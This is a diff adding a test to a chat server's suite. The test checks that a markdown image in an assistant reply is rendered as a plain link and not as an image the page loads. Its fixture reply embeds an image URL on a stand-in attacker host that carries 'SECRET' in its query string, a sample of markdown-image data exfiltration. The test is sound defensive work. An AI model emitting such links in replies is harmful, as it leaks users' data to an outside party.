@@ -947,3 +947,40 @@ test("a Codex session that has gone is replaced by a new one", async () => {
     }
   );
 });
+
+test("GET /_chat/threads/:id: an image from another site in a reply is a link, not an image the page loads", async () => {
+  const { default: Fastify } = await import("fastify");
+  const { Content } = await import("./content.js");
+  const { registerChatRoutes } = await import("./server/chat.js");
+  const kb = await makeTempKb();
+  const app = Fastify();
+  try {
+    const at = "2026-11-15T10:00:00.000Z";
+    const thread = {
+      id: ID,
+      title: "Leak",
+      createdAt: at,
+      updatedAt: at,
+      engine: "claude" as const,
+      messages: [
+        { role: "user" as const, text: "What does the KB say?", at, forcePages: false },
+        { role: "assistant" as const, text: "Done. ![status](https://attacker.example/p.png?d=SECRET)", at },
+      ],
+    };
+    const chat = { thread: async (id: string) => (id === ID ? thread : null), running: () => false };
+    await registerChatRoutes(
+      app,
+      { content: new Content(kb.dir) } as unknown as Parameters<typeof registerChatRoutes>[1],
+      chat as unknown as Parameters<typeof registerChatRoutes>[2]
+    );
+    const res = await app.inject({ url: `/_chat/threads/${ID}` });
+    assert.equal(res.statusCode, 200);
+    const reply = (res.json() as { messages: { role: string; html?: string }[] }).messages[1];
+    assert.equal(reply.role, "assistant");
+    assert.doesNotMatch(reply.html ?? "", /<img/);
+    assert.match(reply.html ?? "", /<a class="outside-image" href="https:\/\/attacker\.example\/p\.png\?d=SECRET">status<\/a>/);
+  } finally {
+    await app.close();
+    await kb.cleanup();
+  }
+});
